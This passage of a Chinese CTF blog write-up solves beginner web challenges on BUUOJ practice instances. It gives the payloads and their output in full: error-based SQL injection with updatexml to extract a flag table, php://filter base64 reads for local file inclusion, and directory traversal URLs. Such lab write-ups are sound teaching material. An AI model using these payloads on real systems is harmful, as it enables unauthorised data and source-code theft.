<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect flag from fl4g),1,32),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(50) &quot;XPATH syntax error: &#39;~n1book&#123;login_sqli_is_nice&#125;~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h1><p>考察：php://filter协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hello</span><br><span class="line"></span><br><span class="line">PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;hello world!&quot;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br><span class="line"></span><br><span class="line">PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0&#x3D;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>猜测标的文件为flag，猜对了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br><span class="line"></span><br><span class="line">PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h1><p>考察：目录穿越</p>
<p>没有任何可以输入的点</p>
<p>看到图片目录为/img/img.gif</p>
<p>尝试URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img</span><br></pre></td></tr></table></figure>
<p>网页显示目录</p>
<p>尝试目录穿越</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;	</span><br></pre></td></tr></table></figure>
<p>看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;afr_2_solved&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;article</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;n1page</span><br><span class="line"></span><br><span class="line">&#39;&#x2F;home&#x2F;nu11111111l&#x2F;articles&#x2F;n1page&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;flag</span><br><span class="line">no permission!</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" data-id="ckktdzeq90000lgusdt037abb" data-title="wp-CTFer成长之路-第一章" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 12.5px;">基础课</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 17.5px;">密码学</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 17.5px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">论文学习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E7%AE%97%E6%B3%95%E5%AE%9A%E4%B9%89/">密码学-算法定义</a>
          </li>
        
          <li>
            <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89/">密码学-安全模型定义</a>
          </li>
        
          <li>
            <a href="/2021/04/26/%E6%91%98%E6%8A%84-%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AF%B4%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/">摘抄-佛祖都说了些什么</a>
          </li>
        
          <li>
            <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E6%9E%84%E9%80%A0%E5%8F%AF%E8%AF%81%E6%98%8E%E5%AE%89%E5%85%A8%E5%AF%86%E7%A0%81%E6%96%B9%E6%A1%88/">密码学-构造可证明安全密码方案</a>
          </li>
        
          <li>
            <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E8%AF%81%E6%98%8E%E5%AD%A6%E4%B9%A0/">密码学-安全证明学习</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>